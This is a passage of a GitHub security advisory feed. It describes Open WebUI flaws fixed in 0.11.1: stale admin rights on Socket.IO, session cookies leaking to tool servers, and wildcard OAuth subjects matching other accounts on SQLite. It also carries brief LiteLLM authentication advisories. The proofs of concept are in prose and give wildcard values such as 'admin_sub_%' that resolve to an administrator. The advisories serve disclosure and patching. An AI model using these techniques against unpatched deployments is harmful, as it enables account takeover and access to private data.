        <title type="html"><![CDATA[[open-webui] Open WebUI: Admin demoted through SSO role sync keeps read and write access to all users' notes]]></title>
        <id>https://github.com/advisories/GHSA-wjwr-xfp9-r66p</id>
        <link href="https://github.com/advisories/GHSA-wjwr-xfp9-r66p"/>
        <updated>2026-09-10T22:41:34.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A user who is demoted from admin by an identity provider keeps admin-level read and write access to every user's notes, over any Socket.IO connection that was already open when the demotion happened. Open WebUI caches the user's role on the socket at connection time, and the two SSO role-sync paths, the reverse-proxy trusted role header and OAuth role mapping, changed the role in the database without tearing that cached session down. Only the admin user-management endpoints invalidated sessions, so a demotion driven by the identity provider left the old privileges live on the socket.</p>
<h2 id="preconditions">Preconditions</h2>
<p>A role-sync SSO mode has to be enabled. Either trusted-header authentication with <code>WEBUI_AUTH_TRUSTED_ROLE_HEADER</code> set, which is unset by default, or OAuth with role mapping enabled, which is off by default. Deployments that change roles only through the admin panel are not affected, because that path already invalidated the user's sockets.</p>
<p>The account has to be an admin at the moment it opens a Socket.IO connection, has to keep that connection open across the demotion, and has to be demoted through the SSO path rather than through the admin panel. Signing out, reloading the page, or any network interruption ends the exposure, because the reconnect reads a fresh role from the database.</p>
<h2 id="impact">Impact</h2>
<p>Until the socket closes, the demoted account can open and edit any user's note through the collaborative-notes socket handlers, which grant admins access to every note. That is read and write access to other users' private notes, held by someone the operator has already removed from the admin role.</p>
<p>The rest of the product is not affected. Every HTTP endpoint reads the role fresh from the database on each request, so the demoted account has no admin access to the REST API, no user management, no settings and no model or connection configuration. The exposure ends the moment the connection drops, and the account controls that only by keeping the browser tab open.</p>
<p>The realistic case is off-boarding or a least-privilege downgrade performed in the identity provider, which is a normal administrative action rather than a misconfiguration.</p>
<h2 id="fix">Fix</h2>
<p>Fixed in 0.11.1 by commit <code>ce3c175e260709f359d7e6cbb3132f0572098b95</code>. Role changes and user deletions now publish an internal event, and a session handler tears down that user's Socket.IO connections whenever the event fires, so every path that can change a role invalidates cached sessions instead of only the admin endpoints. Upgrading is sufficient, no configuration change is needed.</p>
<h2 id="root-cause">Root cause</h2>
<p>Affected components:</p>
<ul>
<li><code>backend/open_webui/routers/auths.py</code>, the trusted-header role sync in the sign-in handler.</li>
<li><code>backend/open_webui/utils/oauth.py</code>, the OAuth role sync run on login.</li>
<li><code>backend/open_webui/socket/main.py</code>, which caches the user record on the socket and authorizes the collaborative-notes handlers against that cached copy.</li>
</ul>
<p>Session invalidation on role change was added as an explicit call, made at the call sites that changed a role rather than inside the role-change itself. The admin user-management endpoints made that call, the two SSO sync paths did not, and nothing else refreshed the role cached on an open socket. The socket keep-alive rewrites the cached record to reset the idle timer and preserves the stale role while doing so, so a connection that stays active is never reaped. Because the notes handlers grant full access to any note when the cached role reads admin, the gap turned into read and write access over all notes for as long as the connection lived.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<p>Deploy Open WebUI with trusted-header authentication and <code>WEBUI_AUTH_TRUSTED_ROLE_HEADER</code> set, or with OAuth role mapping enabled. Sign in as an admin and leave the browser open on a page holding a Socket.IO connection. Demote the account through the identity provider, meaning the next sign-in carries the role header set to <code>user</code>, or the account's group is changed at the OAuth provider. The database role is now <code>user</code>.</p>
<p>Over the connection that is still open, join and edit another user's note by its id. Both are granted, because the role cached on that socket still reads admin. Performing the same demotion through the admin panel instead drops the connection and revokes the access, which is the behaviour the SSO paths were missing.</p>
<p>This was established by source inspection against 0.11.0 rather than by an executed exploit.</p>
<h2 id="credits">Credits</h2>
<p>Reported by @mtholmquist.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-wjwr-xfp9-r66p">https://github.com/open-webui/open-webui/security/advisories/GHSA-wjwr-xfp9-r66p</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-87014">https://nvd.nist.gov/vuln/detail/CVE-2026-87014</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/ce3c175e260709f359d7e6cbb3132f0572098b95">https://github.com/open-webui/open-webui/commit/ce3c175e260709f359d7e6cbb3132f0572098b95</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.11.1">https://github.com/open-webui/open-webui/releases/tag/v0.11.1</a></li>
<li><a href="https://github.com/advisories/GHSA-wjwr-xfp9-r66p">https://github.com/advisories/GHSA-wjwr-xfp9-r66p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wjwr-xfp9-r66p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-10T22:41:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[litellm] LiteLLM: SSO Debug Flow Has Improper Authentication]]></title>
        <id>https://github.com/advisories/GHSA-j37q-q7p9-vpwm</id>
        <link href="https://github.com/advisories/GHSA-j37q-q7p9-vpwm"/>
        <updated>2026-09-10T22:34:40.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was determined in BerriAI litellm up to 1.82.2. This affects the function json.dumps of the file litellm/proxy/management_endpoints/ui_sso.py of the component SSO Debug Flow. Executing a manipulation can lead to missing authentication. The attack can be executed remotely. The exploit has been publicly disclosed and may be utilized. The vendor was contacted early about this disclosure.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12795">https://nvd.nist.gov/vuln/detail/CVE-2026-12795</a></li>
<li><a href="https://gist.github.com/YLChen-007/9b13c75a3a73187a4082cc6df0b100d3">https://gist.github.com/YLChen-007/9b13c75a3a73187a4082cc6df0b100d3</a></li>
<li><a href="https://vuldb.com/cve/CVE-2026-12795">https://vuldb.com/cve/CVE-2026-12795</a></li>
<li><a href="https://vuldb.com/submit/811286">https://vuldb.com/submit/811286</a></li>
<li><a href="https://vuldb.com/vuln/372557">https://vuldb.com/vuln/372557</a></li>
<li><a href="https://vuldb.com/vuln/372557/cti">https://vuldb.com/vuln/372557/cti</a></li>
<li><a href="https://github.com/advisories/GHSA-j37q-q7p9-vpwm">https://github.com/advisories/GHSA-j37q-q7p9-vpwm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j37q-q7p9-vpwm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-21T09:30:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[litellm] LiteLLM: Admin Key Handler Has Improper Authorization]]></title>
        <id>https://github.com/advisories/GHSA-6qr3-3g89-m4jj</id>
        <link href="https://github.com/advisories/GHSA-6qr3-3g89-m4jj"/>
        <updated>2026-09-10T22:32:50.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was determined in BerriAI litellm up to 1.63.1. The impacted element is an unknown function of the file litellm/proxy/management_endpoints/key_management_endpoints.py of the component Admin Key Handler. This manipulation causes improper authorization. The attack can be initiated remotely. The exploit has been publicly disclosed and may be utilized. The vendor was contacted early about this disclosure.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12770">https://nvd.nist.gov/vuln/detail/CVE-2026-12770</a></li>
<li><a href="https://gist.github.com/YLChen-007/993c68152b2c770d53590f1684c755d4">https://gist.github.com/YLChen-007/993c68152b2c770d53590f1684c755d4</a></li>
<li><a href="https://vuldb.com/cve/CVE-2026-12770">https://vuldb.com/cve/CVE-2026-12770</a></li>
<li><a href="https://vuldb.com/submit/811279">https://vuldb.com/submit/811279</a></li>
<li><a href="https://vuldb.com/vuln/372512">https://vuldb.com/vuln/372512</a></li>
<li><a href="https://vuldb.com/vuln/372512/cti">https://vuldb.com/vuln/372512/cti</a></li>
<li><a href="https://github.com/BerriAI/litellm/pull/23781">https://github.com/BerriAI/litellm/pull/23781</a></li>
<li><a href="https://github.com/BerriAI/litellm">https://github.com/BerriAI/litellm</a></li>
<li><a href="https://github.com/advisories/GHSA-6qr3-3g89-m4jj">https://github.com/advisories/GHSA-6qr3-3g89-m4jj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6qr3-3g89-m4jj</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-06-21T03:30:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[litellm] LiteLLM: MCP Proxy Has Improper Authentication]]></title>
        <id>https://github.com/advisories/GHSA-4jcj-7x88-m979</id>
        <link href="https://github.com/advisories/GHSA-4jcj-7x88-m979"/>
        <updated>2026-09-10T22:32:03.000Z</updated>
        <content type="html"><![CDATA[<p>A weakness has been identified in BerriAI litellm up to 1.59.8. Affected is the function UserAPIKeyAuth of the file litellm/proxy/_experimental/mcp_server/auth/user_api_key_auth_mcp.py of the component MCP Proxy. Executing a manipulation can lead to improper authentication. The attack may be launched remotely. The exploit has been made available to the public and could be used for attacks. The vendor was contacted early about this disclosure.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12773">https://nvd.nist.gov/vuln/detail/CVE-2026-12773</a></li>
<li><a href="https://gist.github.com/YLChen-007/3cfaad10a69d7a15e4d4d458cb53309e">https://gist.github.com/YLChen-007/3cfaad10a69d7a15e4d4d458cb53309e</a></li>
<li><a href="https://vuldb.com/cve/CVE-2026-12773">https://vuldb.com/cve/CVE-2026-12773</a></li>
<li><a href="https://vuldb.com/submit/811282">https://vuldb.com/submit/811282</a></li>
<li><a href="https://vuldb.com/vuln/372515">https://vuldb.com/vuln/372515</a></li>
<li><a href="https://vuldb.com/vuln/372515/cti">https://vuldb.com/vuln/372515/cti</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2026-12773">https://access.redhat.com/security/cve/CVE-2026-12773</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2491112">https://bugzilla.redhat.com/show_bug.cgi?id=2491112</a></li>
<li><a href="https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-12773.json">https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-12773.json</a></li>
<li><a href="https://github.com/BerriAI/litellm/commit/73869f0faf7d11ee21adcb5f91b8c33a340b6c2c">https://github.com/BerriAI/litellm/commit/73869f0faf7d11ee21adcb5f91b8c33a340b6c2c</a></li>
<li><a href="https://github.com/advisories/GHSA-4jcj-7x88-m979">https://github.com/advisories/GHSA-4jcj-7x88-m979</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4jcj-7x88-m979</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-21T06:32:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: A user's session cookies are sent to tool servers configured for bearer authentication]]></title>
        <id>https://github.com/advisories/GHSA-p78m-89r6-pgf7</id>
        <link href="https://github.com/advisories/GHSA-p78m-89r6-pgf7"/>
        <updated>2026-09-10T21:23:45.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>When more than one external tool server is reachable in the same request, a tool call to a server configured for bearer authentication can arrive carrying the calling user's Open WebUI session cookies alongside that server's own key. The cookie jar is built per connection, but the callable that performs the request reads it late instead of per connection, so every tool callable built in the same pass sends the cookies belonging to whichever connection was processed last. An administrator who configures a server with its own API key has not chosen to send that server anything else, and the operator of that server receives a live session credential for the user who triggered the call.</p>
<h2 id="preconditions">Preconditions</h2>
<p>At least two external tool servers must be attached to the same request, and at least one of them must be set to session or system OAuth authentication, since no cookie jar is assembled otherwise. The connection using that authentication mode must be the one processed last, which follows the order of the tool servers attached to the request rather than anything the receiving party controls.</p>
<p>A deployment with no tool servers, with only one tool server, or where no attached server uses session or system OAuth authentication, is not affected. Tool servers are not configured by default.</p>
<h2 id="impact">Impact</h2>
<p>The operator of a tool server that was configured with only its own API key receives the session token of every user whose tool call reaches it. That token authenticates as the user against the whole application, so the receiving party can act as that user for the lifetime of the token, which is a full account takeover of anyone whose request lands on that server. Where the affected user is an administrator, the receiving party gains administrative access.</p>
<p>The receiving party is the operator of a server the administrator deliberately registered, so this is a disclosure of user credentials to a partially trusted third party rather than to an arbitrary attacker. It nonetheless crosses a boundary the administrator set, because selecting bearer authentication for a connection states that the connection is authenticated by its own key alone. The leak does not depend on the tool server behaving maliciously to obtain the token, only on it receiving and retaining ordinary request data.</p>
<h2 id="fix">Fix</h2>
<p>Fixed in 0.11.1 by <a href="https://github.com/open-webui/open-webui/pull/28630">https://github.com/open-webui/open-webui/pull/28630</a>. The tool callable now takes its own connection's cookie jar as a parameter, in the same way it already took that connection's headers, so each request carries only what its own connection was configured to send. Upgrading resolves the issue with no configuration change.</p>
<h2 id="root-cause">Root cause</h2>
<p>Affected component: the tool loading routine in <code>backend/open_webui/utils/tools.py</code>, which builds one callable per tool across all attached connections; the header and cookie builder in the same module, which populates a cookie jar only for session and system OAuth connections; and the tool server request function, which places the supplied jar on the outgoing request.</p>
<p>Headers were passed into the callable factory as an argument and were therefore fixed per connection, while the cookie jar was left as a variable in the enclosing scope and was read only when the tool was finally invoked. By then both loops had completed and the variable held the last value assigned to it. The two values are produced together by the same builder and were plainly intended to travel together, so this is an oversight in how one of them was captured rather than a forwarding decision. The equivalent code path for terminal tool servers in the same module binds both values per connection and does not carry the defect.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<p>Two tool servers were registered: one using bearer authentication with its own key, and one using session authentication, with the session connection processed last. A tool call was driven to an operation belonging to the bearer server, and that server recorded the incoming request.</p>
<p>The bearer server received its own key in the authorization header, together with the calling user's <code>token</code> and <code>oauth_session_id</code> cookies. The received token matched the calling user's session token.</p>
<p>Control: with the session connection removed and only the bearer server registered, the same tool call arrived with no cookies at all, confirming that the leak depends on a session connection being present and processed last.</p>
<p>Reproduced against a running instance built from the affected snapshot, with the receiving tool servers replaced by recording servers.</p>
<h2 id="credits">Credits</h2>
<p>Classic298, who reported the issue and demonstrated the cross-connection cookie leak against a running instance.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-p78m-89r6-pgf7">https://github.com/open-webui/open-webui/security/advisories/GHSA-p78m-89r6-pgf7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-87015">https://nvd.nist.gov/vuln/detail/CVE-2026-87015</a></li>
<li><a href="https://github.com/open-webui/open-webui/pull/28630">https://github.com/open-webui/open-webui/pull/28630</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/cd9db21c5276807a2975ddba17cef369ad1114b7">https://github.com/open-webui/open-webui/commit/cd9db21c5276807a2975ddba17cef369ad1114b7</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.11.1">https://github.com/open-webui/open-webui/releases/tag/v0.11.1</a></li>
<li><a href="https://github.com/advisories/GHSA-p78m-89r6-pgf7">https://github.com/advisories/GHSA-p78m-89r6-pgf7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p78m-89r6-pgf7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-10T21:23:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: Sign-in as another user via wildcard characters in the OAuth subject claim on SQLite]]></title>
        <id>https://github.com/advisories/GHSA-wpmr-8h3q-fwj7</id>
        <link href="https://github.com/advisories/GHSA-wpmr-8h3q-fwj7"/>
        <updated>2026-09-10T21:23:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>On SQLite deployments, the lookup that maps an external identity to a local account does a substring match instead of an exact match. A subject value containing SQL wildcard characters therefore matches accounts the value was never issued for, and the sign-in binds to whichever account the database returns first, which can be an administrator. The same defect affects SCIM external-ID resolution. PostgreSQL deployments are not affected, because they take a separate and correct code path.</p>
<h2 id="preconditions">Preconditions</h2>
<ul>
<li>The database is SQLite. This is the default backend. PostgreSQL deployments are not affected at all.</li>
<li>OAuth or OIDC sign-in is configured, or SCIM provisioning is enabled. Both are off by default.</li>
<li>For an attacker to steer the match deliberately, they must control the value of the claim Open WebUI uses as the subject. That value is normally assigned by the identity provider and is not attacker-controlled: the shipped GitHub and Feishu configurations use provider-assigned numeric identifiers, and a standard OIDC <code>sub</code> is provider-assigned. The deliberate case therefore requires an operator to have pointed <code>OAUTH_SUB_CLAIM</code> at a claim the end user can set at the identity provider, such as a username or email claim, or an identity provider that lets a user choose their own subject value.</li>
<li>No attacker and no misconfiguration are needed for the accidental case. A legitimate subject value that happens to contain an underscore matches other accounts as well, and which account is returned depends on database row order.</li>
<li>For the SCIM path, the caller must already hold the SCIM bearer token, which is a privileged credential.</li>
</ul>
<h2 id="impact">Impact</h2>
<p>A sign-in can be bound to an account other than the one the identity provider authenticated. Where the operator has made the subject claim user-settable, an attacker who registers at that provider can choose a value that matches an existing account and receive a session for it, including an administrator account, which is a full compromise of the instance. Where the subject claim is provider-assigned, the deliberate attack is not available, and what remains is a correctness failure in which an ordinary subject value containing an underscore can resolve to the wrong account and hand one user another user's session non-deterministically.</p>
<p>The defect is in the identity match itself, so it is not mitigated by any downstream permission check: by the time a session is issued the wrong account has already been selected. It does not allow account creation, and it does not affect password sign-in, PostgreSQL deployments, or any deployment with OAuth, OIDC and SCIM all disabled.</p>
<h2 id="fix">Fix</h2>
<p>Fixed in 0.11.1 by <a href="https://github.com/open-webui/open-webui/pull/28624">https://github.com/open-webui/open-webui/pull/28624</a>. The two identity lookups now compare the nested JSON value directly through SQLAlchemy's JSON subscript operator, which emits an exact match on both supported databases, instead of going through the column-level <code>contains()</code> operator that degraded to a substring comparison on SQLite. The hand-written per-dialect branching is removed, since the operator already handles both backends.</p>
<p>Upgrading fully resolves it and no configuration change is required. Existing stored identities are unaffected, as the stored format does not change.</p>
<h2 id="root-cause">Root cause</h2>
<ul>
<li><code>backend/open_webui/models/users.py</code> — <code>get_user_by_oauth_sub</code>, resolves an OAuth or OIDC identity to a local account.</li>
<li><code>backend/open_webui/models/users.py</code> — <code>get_user_by_scim_external_id</code>, the same pattern for SCIM.</li>
<li>Reached from the OAuth callback handler and the OAuth token-exchange handler, and from the SCIM user routes.</li>
<li>Affects builds running on SQLite, which is the default database.</li>
</ul>
<p>The <code>oauth</code> and <code>scim</code> columns are declared with SQLAlchemy's generic <code>JSON</code> type. That type does not implement a containment comparator, so a <code>contains()</code> call against it falls back to the generic string operator and compiles to a <code>LIKE</code> with the operand wrapped in <code>%</code> on both sides. The intent was a JSON containment test; what was emitted was a substring test against the serialized JSON, in which <code>%</code> and <code>_</code> carry their usual <code>LIKE</code> meaning. The PostgreSQL branch was written separately against <code>JSONB</code> with an equality comparison and is correct, which is why the defect is confined to the default backend and why it survived review: the two branches look symmetrical and only one of them does what it appears to do.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<p>Against a SQLite instance with an OIDC provider configured, two accounts exist: an administrator whose stored subject is <code>admin_sub_9999</code>, and an ordinary user whose stored subject is <code>bob_sub_1234</code>. Both rows were seeded directly rather than created through a live provider sign-in; the lookup under test was then called as the application calls it.</p>
<p>Resolving the subject value <code>%</code> returns the administrator account. Resolving <code>admin_sub_%</code> likewise returns the administrator account. Resolving the correct full values returns the correct accounts, and resolving an unknown value returns nothing, so the failure is visible only when the supplied value contains a wildcard character. A subsequent check with an ordinary subject value containing an underscore showed it matching more than one account, with the returned account determined by row order.</p>
<h2 id="credits">Credits</h2>
<p>Reported by @Classic298.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-wpmr-8h3q-fwj7">https://github.com/open-webui/open-webui/security/advisories/GHSA-wpmr-8h3q-fwj7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-87016">https://nvd.nist.gov/vuln/detail/CVE-2026-87016</a></li>
<li><a href="https://github.com/open-webui/open-webui/pull/28624">https://github.com/open-webui/open-webui/pull/28624</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/73c1f5806aeb6345dad5de8f5aa26d1f3d0bef80">https://github.com/open-webui/open-webui/commit/73c1f5806aeb6345dad5de8f5aa26d1f3d0bef80</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.11.1">https://github.com/open-webui/open-webui/releases/tag/v0.11.1</a></li>
<li><a href="https://github.com/advisories/GHSA-wpmr-8h3q-fwj7">https://github.com/advisories/GHSA-wpmr-8h3q-fwj7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wpmr-8h3q-fwj7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-10T21:23:25.000Z</published>
    </entry>
</feed>